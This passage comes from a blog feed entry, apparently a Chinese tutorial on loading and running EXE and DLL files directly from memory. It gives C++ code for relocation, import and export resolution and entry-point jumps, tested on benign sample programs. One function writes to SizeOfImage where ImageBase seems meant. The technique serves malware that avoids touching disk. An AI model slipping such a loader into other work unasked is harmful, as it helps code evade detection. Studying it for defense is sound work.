class="hljs-comment">//开始扫描重定位表</span><br><span class="hljs-keyword">while</span> ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始</span><br>WORD* pRelocData = (WORD*)((PBYTE)pReloc + <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION));<br><span class="hljs-comment">//获取需要重定位的数据的个数</span><br><span class="hljs-keyword">int</span> nNumberOfReloc = (pReloc-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-keyword">sizeof</span>(WORD);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nNumberOfReloc; i++) &#123;<br>            <span class="hljs-comment">//高位是否为3，判断是否需要修复</span><br><span class="hljs-keyword">if</span> ((DWORD)(pRelocData[i] &amp; <span class="hljs-number">0x0000F000</span>) == <span class="hljs-number">0x00003000</span>) &#123; <br><span class="hljs-comment">//获取需要重定位数据的地址</span><br>DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; <span class="hljs-number">0x0FFF</span>));<br><span class="hljs-comment">//修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值</span><br>DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase;<br>*pAddress += dwDelta;<br>&#125;<br>&#125;<br><span class="hljs-comment">//继续处理下一组重定位数据</span><br>pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock);<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*获取导入表的相关数据</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoImportTable</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取导入表地址</span><br>PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);<br><span class="hljs-comment">// 循环遍历导入表中的DLL及获取导入表中的函数地址</span><br><span class="hljs-keyword">char</span>* lpDllName = <span class="hljs-literal">NULL</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportNameArray = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="hljs-literal">NULL</span>;<br>FARPROC lpFuncAddress = <span class="hljs-literal">NULL</span>;<br>DWORD i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pImportTable-&gt;OriginalFirstThunk) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 获取导入表中DLL的名称并加载DLL</span><br>lpDllName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + pImportTable-&gt;Name);<br>hDll = <span class="hljs-built_in">GetModuleHandleA</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll) &#123;<br>hDll = <span class="hljs-built_in">LoadLibraryA</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll) &#123;<br>pImportTable++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span><br>lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk);<br><span class="hljs-comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span><br>lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk);<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == lpImportNameArray[i].u1.AddressOfData) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 获取IMAGE_IMPORT_BY_NAME结构</span><br>lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData);<br><span class="hljs-comment">// 判断导出函数是序号导出还是函数名称导出</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal) &#123;<br><span class="hljs-comment">// 序号导出</span><br><span class="hljs-comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span><br>lpFuncAddress = <span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="hljs-number">0x0000FFFF</span>));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 名称导出</span><br>lpFuncAddress = <span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)lpImportByName-&gt;Name);<br>&#125;<br>lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress;<br>i++;<br>&#125;<br>pImportTable++;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="修改ImageBase"><a href="#修改ImageBase" class="headerlink" title="修改ImageBase"></a>修改ImageBase</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//修改ImageBase</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetImage</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h5><p>如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">Entry</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br>__asm &#123;<br>mov eax,Entry<br>jmp eax<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1ackie!!!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行程序查看效果，可以看到直接加载运行TestProcess.exe。</p><p><img src="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/1.png"></p><p>若是DLL文件，还需要构造一下DLLMAIN</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CallDllMain</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>typedef_DllMain DllMain = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br>BOOL bRet = <span class="hljs-built_in">DllMain</span>((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (bRet == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;构造入口点失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*获取导出函数及其地址</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">* lpszFuncName：导出函数名字</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">LPVOID <span class="hljs-title">GetExFuncAddr</span><span class="hljs-params">(LPVOID lpBaseAddr,<span class="hljs-keyword">char</span>* lpszFuncName)</span> </span>&#123;<br>LPVOID lpFunc = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取导出表地址</span><br>PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + <br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><span class="hljs-comment">//从导出表取出的函数名</span><br><span class="hljs-keyword">char</span>* lpFuncName = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取AddressOfNames</span><br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames);<br><span class="hljs-comment">//获取AddressOfNameOrdinals</span><br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals);<br><span class="hljs-comment">//索引值</span><br>WORD wHint = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//获取AddressOfFunctions</span><br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions);<br><span class="hljs-comment">//获取所有根据名称导出的函数数量</span><br>DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwNumberOfNames; i++) &#123;<br>lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (strcmpi(lpFuncName, lpszFuncName) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//获取索引值</span><br>wHint = lpAddressOfNameOrdinalArray[i];<br><span class="hljs-comment">//根据索引值，在AddressOfFunctions中取出RVA</span><br>lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//返回函数地址</span><br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。</p><p><img src="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;内存直接加载运行&quot;&gt;&lt;a href=&quot;#内存直接加载运行&quot; class=&quot;headerlink&quot; title=&quot;内存直接加载运行&quot;&gt;&lt;/a&gt;内存直接加载运行&lt;/h4&gt;&lt;p&gt;内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="启动技术" scheme="https://b1ackie.cn/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
    <category term="PE" scheme="https://b1ackie.cn/tags/PE/"/>
    
  </entry>
  
</feed>
